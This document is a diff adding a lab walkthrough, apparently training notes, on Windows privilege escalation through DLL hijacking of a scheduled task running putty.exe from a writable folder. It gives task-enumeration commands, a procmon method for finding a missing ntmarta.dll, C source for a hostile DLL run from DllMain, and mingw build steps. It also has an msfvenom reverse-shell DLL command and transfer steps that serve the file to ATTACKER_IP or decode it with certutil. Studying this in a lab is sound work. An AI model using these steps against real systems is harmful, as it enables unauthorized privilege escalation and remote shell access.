@@ -1,3 +1,5 @@
+
+
 Modes & Levels
 Kernel Mode vs User Mode
 Privileged vs Unprivileged
@@ -59,5 +61,128 @@ System services (LocalSystem, LocalService, NetworkService)
 
 
 
+
+
+
+The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:
+
+schtasks /query /fo LIST /v
+
+List all Tasks in List format
+
+schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
+
+Select-String can utilize regex to output only values that match
+
+schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+
+Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.
+
+schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
+
+Excludes results that we dont want to seein order to help narrow down vulnerable directory locations
+
+Open and view tasks from the Task Scheduler GUI Application
+
+Identify the following vulnerable Task:
+
+C:\Users\student\exercise_2\putty.exe
+
+Run: sigcheck c:\users\student\exercise_2\putty.exe
+
+Determines information we can use to research for vulnerabilities
+
+Run: icacls "c:\users\student\exercise_2"
+
+Check if the directory can be written to, as it is non-standard
+
+
+Process Monitor
+
+Run: procmon /AcceptEula
+
+Run: C:\Users\student\exercise_2\putty.exe
+
+Configure the following filters by pressing CTRL + L to open the filter menu:
+
+Process Name contains putty.exe
+
+Path contains .dll
+
+Result is NAME NOT FOUND
+
+procmonputty
+
+
+As you can see ntmarta.dll is identified. As procmon requires Admin privileges, ways to perform testing can be locally within a development/lab environment.
+
+Creating Malicious DLL
+Since we can see that it is trying load a .dll that is not present, and that the directory where putty.exe is located is writable and non-standard we can create a malicious DLL.
+
+Create bad.c and specify desired commands the execute via WinExec():
+
+nano bad.c
+
+#include <windows.h>
+int execCommand()
+{
+ WinExec("cmd /C whoami > FINDME_1.txt", 1);
+ return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ execCommand();
+ return 0;
+}
+Install all of the programs required to build Windows Portable Executable (PE) files:
+
+apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y
+
+Compiles the raw C source code in bad.c into a unlinked c object name bad.o:
+
+i686-w64-mingw32-g++ -c bad.c -o bad.o
+
+The -Wl, Creates a shared object (a DLL) from source.o named bad.dll. It also creates an import library name bad.a for the DLL which isn’t used for this exploit:
+
+i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
+
+Alternative method for DLL creation using MSFVenom
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > bad.dll
+
+Once the malicious dll has been createdit must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file.
+
+Transfering the DLL
+Once the malicious dll has been created, it must be uploaded to the host. Use of scp, ftp, nc, python simple HTTP server, or copying base64 output.
+
+Transfer the DLL to the target machine using one of the following methods:
+
+Create a Simple HTTP server, and then browse to it from the target
+
+On Machine with DLL: python -m SimpleHTTPServer 8000
+
+On Target: Browse to http://ATTACKER_IP:8000
+
+base64 encode the .dll and copy/paste to the target
+
+On Machine with DLL: base64 bad.dll > base64dll
+
+Copy and paste the entire text of the encoded base64dll file
+
+On Target:
+
+Paste the contents of base64dll into base64.txt
+
+Run: move base64.txt base64
+
+Run: certutil -decode base64 ntmarta.dll
+
+Put the retrieved DLL in the same location as the vulnerable Putty executable
+
+Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"
+
+Allow for Putty to execute with scheduled task
+
+If the above steps were followed, a command prompt or two will flash on the screen, and a text file will be created in the same location where putty is.
 
 
